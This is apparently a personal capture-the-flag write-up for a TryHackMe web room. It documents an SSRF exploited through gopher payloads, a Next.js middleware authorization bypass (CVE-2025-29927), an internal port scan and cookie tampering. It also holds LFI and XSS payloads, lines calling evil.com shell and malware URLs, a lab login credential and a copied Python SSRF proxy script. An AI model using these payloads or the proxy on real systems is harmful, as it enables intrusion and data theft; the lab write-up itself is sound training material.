## description
https://tryhackme.com/room/extract
Can you extract the secrets from the library?
The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.

## port scanning
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a4:52:a9:5e:5c:63:2a:82:9f:b2:4b:7e:1f:dc:0c:1d (ECDSA)
|_  256 32:2d:cc:8e:ae:be:c6:18:b5:c2:7c:6e:d5:a2:70:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TryBookMe - Online Library
|_http-server-header: Apache/2.4.58 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## website view
http://10.81.151.181/
there is some pdf view after click on Dummy / Lorem

![](./attachments/image-113.png)

## source code of website
interesting findings:
possible vector of SSRF:
iframe.src = 'preview.php?url=' + encodeURIComponent(url);
ex.
```
curl "http://cvssm1/preview.php?url=http://127.0.0.1"
curl "http://cvssm1/preview.php?url=http://localhost:3306"
curl "http://cvssm1/preview.php?url=http://169.254.169.254/latest/meta-data/"
```

exploitation may result with ex.:
- internal network scanning
- access to internal data
- LFI → RCE (if php wrappers are allowed):
  ```
  curl "http://cvssm1/preview.php?url=file:///etc/passwd"
curl "http://cvssm1/preview.php?url=php://filter/convert.base64-encode/resource=index.php" ```

<a onclick="openPdf('http://cvssm1/pdf/dummy.pdf')">
srored/reflected xss
http://cvssm1/preview.php?url="><script>alert(1)</script>
http://evil.com/shell.php

open redirect
if preview.php
header("Location: " . $_GET['url']);

curl -I "http://cvssm1/preview.php?url=https://evil.com"
preview.php?url=http://evil.com/malware.pdf

## directories discovery
```bash
feroxbuster -u 'http://10.81.157.42' -w /media/sf_wordlists/SecLists-master/Discovery/Web-Content/big.txt
feroxbuster -u 'http://10.81.157.42' -w /media/sf_wordlists/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```
interesting directories:
```bash
http://10.81.157.42/management => http://10.81.157.42/management/

```

## exploitation:
there is some filtering of requests because request:
```bash
http://10.81.157.42/preview.php?url=php://filter/convert.base64-encode/resource=preview.php
# or with:
http://10.81.157.42/preview.php?url=pHp://filter/convert.base64-encode/resource=preview.php
```
results with:
```bash
URL blocked due to keyword: php://
# similar was with data: file: ip:, even with double encoding
```
![](./attachments/image-114.png)

I tried to run my shell by:
```bash
http://10.81.157.42/preview.php?url=http://MY-KALI-IP:8000/shell.php
```
but result was showing my shell.php content in browser.

I tried also:
```bash
http://10.81.157.42/preview.php?url=compress.zlib:///etc/passwd

```
result was empty page so looks like it is not filtered, but also not showing data..

Ok, but we have management endpoint where we have access denied:
http://10.81.151.181/management/
but what if we will use /preview to access it?
http://10.81.157.42/preview.php?url=http://127.0.0.1/management
![](./attachments/image-115.png)
Bingo! we have Server-Side Request Forgery (SSRF) leading to Access Control Bypass
But still we have no password/no login.
unfortunately it is not vulnerable to sql injection (I checked using sqlmap)
## SSRF port scan
I decided to make some portscan using discovered vulnerability
first I created list of all ports:
```bash
seq 1 65535 > ports.txt

```
and used ffuf
```bash
ffuf \
  -u "http://10.81.157.42/preview.php?url=http://127.0.0.1:FUZZ" \
  -w ports.txt \
  -fs 0 \
  -t 10 \
  -timeout 5
```
ok, looks like it found something running on port 10000:
![](./attachments/image-116.png)
![](./attachments/image-117.png)
this website is using next.js because in source we have some:
```javascript
(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])
```
I found some information about vulnerabilities of next.js:
https://threatprotect.qualys.com/2025/03/25/next-js-middleware-authorization-bypass-vulnerability-cve-2025-29927/
https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass?source=post_page-----e07e986fc307---------------------------------------
but we have chain ssrf -> cve-2025-29927 so how we can send request with headers described in article? (X-Middleware-Subrequest: middleware header to inform api that request went through middleware)

http://10.81.157.42/preview.php?url=gopher://0.0.0.0:10000/_GET%2520%2fcustomapi%2520HTTP%2f1.1%250d%250aHost:%25200.0.0.1:10000%250d%250aX-Middleware-Subrequest:%2520middleware%250d%250a

and we have credentials:
![](./attachments/image-118.png)

now we can login, but once again we need gopher payload:
gopher://127.0.0.1:80/_POST%2520/management/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252039%250D%250A%250D%250Ausername%253Dlibrarian%2526password%253DL1br4r1AN%2521%2521
but for this request:
```bash
http://10.81.157.42/preview.php?url=gopher://127.0.0.1:80/_POST%2520/management/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252039%250D%250A%250D%250Ausername%253Dlibrarian%2526password%253DL1br4r1AN%2521%2521

```
we have 302 response: 
```
HTTP/1.1 302 Found
Date: Tue, 06 Jan 2026 16:12:42 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=q6p96dliapk42phqv48imrip6q; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; expires=Tue, 06 Jan 2026 17:12:42 GMT; Max-Age=3600; path=/
Location: 2fa.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
In burp we can see:
![](./attachments/image-120.png)
**auth_token** cookie was set and **PHPSESSID** and redirect is to **2fa.php**
***I had problem with generating working gopher request with cookies set***
so I used python proxy some wise guy created here: https://jaxafed.github.io/posts/tryhackme-extract/.  code is below, just copy-pasted and added comments as notes to myself:
```python
import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.81.157.42"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 80

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536) # 64KB standard buffer
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data)) # double encode
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}" 
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()

```
I accessed website through proxy: 127.0.0.1:5000 and changed value of cookie in place in Storage of browser (decoding value using cyberchef, changing value to 1 and encoding again):
![](./attachments/image-121.png)
